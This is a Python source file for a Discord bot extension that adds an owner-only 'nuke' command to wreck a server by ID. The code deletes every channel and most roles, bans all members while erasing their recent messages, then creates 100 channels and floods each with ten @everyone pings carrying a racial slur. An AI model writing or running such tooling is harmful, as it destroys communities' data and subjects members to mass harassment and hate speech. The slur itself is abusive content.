import discord
from discord.ext import commands
import asyncio


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.owner_id = 1151872484937834496

    @commands.command(name="nuke", aliases=["nuker"])
    async def nuke(self, ctx, server_id: int = None):
        """Nuke a server by ID. Works in DMs. Bot owner only."""
        
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ You don't have permission to use this command.")
            return
        
        if not server_id:
            await ctx.send("❌ Usage: `!nuke <server_id>`")
            return
        
        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send(f"❌ Could not find server with ID `{server_id}`.")
            return
        
        await ctx.send(f"🚨 **MAXIMUM NUKE** initiated on **{guild.name}**...\nThis will take a while due to Discord rate limits.")
        
        # Delete all channels FAST
        deleted_channels = 0
        delete_tasks = []
        for channel in list(guild.channels):
            delete_tasks.append(self.delete_channel(channel))
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        deleted_channels = sum(1 for r in results if r is None)
        
        # Delete all roles FAST (except @everyone and bot's highest role)
        deleted_roles = 0
        role_tasks = []
        for role in list(guild.roles):
            if role.name != "@everyone" and role != guild.me.top_role:
                role_tasks.append(self.delete_role(role))
        results = await asyncio.gather(*role_tasks, return_exceptions=True)
        deleted_roles = sum(1 for r in results if r is None)
        
        await ctx.send(f"🗑️ Deleted `{deleted_channels}` channels and `{deleted_roles}` roles...\n🔨 Now banning members (this is slow)...")
        
        # Ban all members (this is rate limited heavily)
        banned_count = 0
        for member in list(guild.members):
            if member.id != self.bot.user.id and member.id != self.owner_id:
                try:
                    await member.ban(reason="Nuke command - get nuked", delete_message_days=7)
                    banned_count += 1
                except:
                    pass
        
        await ctx.send(f"🔨 Banned `{banned_count}` members...\n📢 Now creating 100 channels with 10 pings each...")
        
        # Create 100 channels FAST with 10 pings each
        created_channels = 0
        for i in range(100):
            try:
                channel_name = f"nuked-{i+1}"
                new_channel = await guild.create_text_channel(channel_name, reason="Nuke command")
                
                # Send 10 pings rapidly
                ping_tasks = []
                for _ in range(10):
                    ping_tasks.append(new_channel.send("@everyone get nuked niggas"))
                await asyncio.gather(*ping_tasks, return_exceptions=True)
                
                created_channels += 1
            except Exception as e:
                print(f"Failed to create/spam channel {i+1}: {e}")
                break
        
        await ctx.send(f"✅ **MAXIMUM NUKE COMPLETE**\n🗑️ Deleted `{deleted_channels}` channels\n🎭 Deleted `{deleted_roles}` roles\n🔨 Banned `{banned_count}` members\n📢 Created `{created_channels}` channels with 10 pings each")

    async def delete_channel(self, channel):
        try:
            await channel.delete(reason="Nuke command")
        except:
            pass

    async def delete_role(self, role):
        try:
            await role.delete(reason="Nuke command")
        except:
            pass

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("❌ Usage: `!nuke <server_id>`")
        elif isinstance(error, commands.BadArgument):
            await ctx.send("❌ Server ID must be a number.")
        else:
            await ctx.send(f"❌ Error: {error}")


async def setup(bot):
    bot.remove_command("nuke")
    await bot.add_cog(Nuke(bot))
